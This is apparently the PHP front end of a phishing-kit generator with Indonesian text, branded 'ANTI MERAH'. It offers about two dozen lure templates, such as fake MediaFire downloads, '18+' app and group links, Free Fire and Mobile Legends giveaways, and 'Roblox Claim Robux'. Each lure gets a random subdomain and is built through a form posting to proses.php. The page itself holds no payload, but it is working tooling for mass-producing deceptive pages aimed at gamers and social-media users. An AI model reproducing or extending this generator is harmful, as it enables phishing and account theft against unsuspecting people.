<?php
function generateRandomSubdomain($length = 30) {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789-';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

$subdomain = generateRandomSubdomain();
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/>
  <link rel="stylesheet" href="https://cdn.stackpath.web.id/css/class.css">
    <link rel="stylesheet" href="https://cdn.stackpath.web.id/css/asrest.css">
  <title>Buat Otomatis | ANTI MERAH</title>
</head>
<body>
  <div class="gateway">
    <div onclick="toggleSource()" class="source">Download Script</div>

    <div class="form">
      <label for="list">TAMPILAN
        <select id="list">
        <option selected disabled>Pilih terlebih dahulu...</option>
        <option value="tamp2">Link MediaFire ZIP</option>
        <option value="tamp3">Link MediaFire MP4</option>       
        <option value="tamp4">Download Aplikasi 18+</option>
        <option value="tamp5">Link Grup WA v1</option>
        <option value="tamp6">Link Grup WA v2</option>
                <option value="tamp7">Link Free Fire v2</option>
        <option value="tamp8">Facebook 18+</option>
        <option value="tamp9">Link Free Fire v1</option>
        <option value="tamp26">Free Fire Beta</option>
        <option value="tamp10">Link Mobile Legends v1</option>
        <option value="tamp11">Link Mobile Legends Beta</option>
        <option value="tamp14">Link Telegram v1</option>
        <option value="tamp15">Link Telegram v2</option>
        <option value="tamp16">Link Unduh Videy v1</option>
        <option value="tamp17">Link Unduh Videy v2</option>
        <option value="tamp18">Link YouTube V1</option>
        <option value="tamp19">Link YouTube V2</option>
        <option value="tamp20">Download Aplikasi 18+ Avcode</option>
        <option value="tamp21">Link Ff Nailong</option>
        <option value="tamp22">Join Chenel Wa 18+</option>
        <option value="tamp23">Grup Massager 18+</option>
        <option value="tamp24">Link Lives FB</option>
        <option value="tamp25">Link Free Fire Spin</option>
                <option value="tamp29">Link Facebook v1</option>
        <option value="tamp27">Link Roblox Claim Robux</option>
        <option value="tamp28">Link Roblox Claim Event</option>
      </select>
    </label>

      <label>NAMA FOLDER
        <input id="subdo-main" name="subdo" type="text" readonly value="<?= $subdomain ?>">
      </label>

      <?php for ($i = 1; $i <= 30; $i++): ?>
        <div class="hidden" id="tamp<?= $i ?>">
          <form method="post" action="proses.php">
            <div class="section-box">
              <div class="section-title">Pemilihan Web</div>
              <input type="hidden" name="nomor" value="<?= $i ?>">
              <input type="hidden" name="subdo" class="subdo-input" value="<?= $subdomain ?>">
              <button type="submit" name="trigger_alpha_92">BUAT WEB</button>
            </div>

            <div class="section-box">
              <div class="section-title">Contoh Gambar Tampilan Webp </div>
              <div class="preview-img-container">
                <img class="preview-img" id="preview-img-<?= $i ?>" src="" alt="Preview" style="display:none;">
              </div>
            </div>
          </form>
        </div>
      <?php endfor; ?>
    </div>
  </div>

  <footer>
    Cara Membuat Webp<a href="https://cdn.stackpath.web.id/video/tutorial/SW6T17/">Pencet Di Sini</a>
  </footer>

  <script>
    function toggleSource() {
      window.location = 'https://cdn.stackpath.web.id/sckuy.php';
    }

    const previewImages = {
tamp2: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/IMG_20251126_214748.jpg',
tamp3: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/IMG_20251126_214934.jpg',
tamp4: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/IMG_20251126_215124.jpg',
tamp5: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/IMG_20251126_215312.jpg',
tamp6: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/IMG_20251126_215605.jpg',
tamp7: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/IMG_20251126_215736.jpg',
tamp8: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/IMG_20251126_220027.jpg',
tamp9: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/IMG_20251126_220140.jpg',
tamp10: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/IMG_20251126_220300.jpg',
tamp11: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/IMG_20251126_220518.jpg',
tamp12: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/IMG_20251127_132800.jpg',
tamp13: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/IMG_20250924_22323.jpg',
tamp14: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/IMG_20250924_22341.jpg',
tamp15: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/IMG_20250924_22354.jpg',
tamp16: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/IMG_20250924_3935.jpg',
tamp17: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/Screenshot_2025093-222357.jpg',
tamp18: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/IMG_2025925_022024.jpg',
tamp19: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/IMG_2250925_022024.jpg',
tamp20: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/IMG_20250925_02442.jpg',
tamp21: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/IMG_2050925_022754.jpg',
tamp22: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/IMG_0250925_023026.jpg',
tamp23: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/IMG_2025925_023316.jpg',
tamp35: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/IMG_2025925_3316.jpg',
tamp36: 'https://cdn.jsdelivr.net/gh/sisstem-google/xhub@main/img/tampilan/IMG_5925_023316.jpg',
    };

    function generateRandomSubdomain(length = 30) {
      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
      let result = '';
      for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return result;
    }

    function showElement(id) {
      document.querySelectorAll('.hidden').forEach(el => el.style.display = 'none');
      document.getElementById(id).style.display = 'block';
    }

    document.getElementById('list').addEventListener('change', function () {
      const selected = this.value;
      const newSub = generateRandomSubdomain();

      document.getElementById('subdo-main').value = newSub;
      document.querySelectorAll('.subdo-input').forEach(input => input.value = newSub);

      showElement(selected);

      const img = document.querySelector(`#${selected} .preview-img`);
      if (previewImages[selected]) {
        img.src = previewImages[selected];
        img.style.display = 'block';
      } else {
        img.style.display = 'none';
      }
    });
  </script>
</body>
</html>
